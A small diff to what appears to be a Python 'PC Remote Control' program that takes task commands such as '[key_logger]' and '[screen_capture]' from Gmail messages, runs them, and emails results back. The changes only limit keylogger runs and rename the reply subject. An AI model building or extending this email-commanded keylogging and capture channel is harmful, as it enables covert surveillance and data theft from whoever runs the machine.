@@ -22,8 +22,12 @@ SCOPES = ["https://mail.google.com/"]
 
 def handle(myAr, mail, msgId, threadId):
     print("Handling Mail")
+    iskeylog = False
     for task in myAr:
         if task.find("[key_logger]") != -1:
+            if iskeylog == True:
+                continue
+            iskeylog = True
             duration = task[13:]
             service.keylogger(int(duration))
         if task == "[screen_capture]":
@@ -79,7 +83,7 @@ def gmail_send_message(mail, messageId, threadId):
 
         message["To"] = mail
         message["From"] = "chiemthoica@gmail.com"
-        message["Subject"] = "PCRC"
+        message["Subject"] = "PC Remote Control"
         message["In-Reply-To"] = messageId
         message["References"] = messageId
         content = "This is the result"
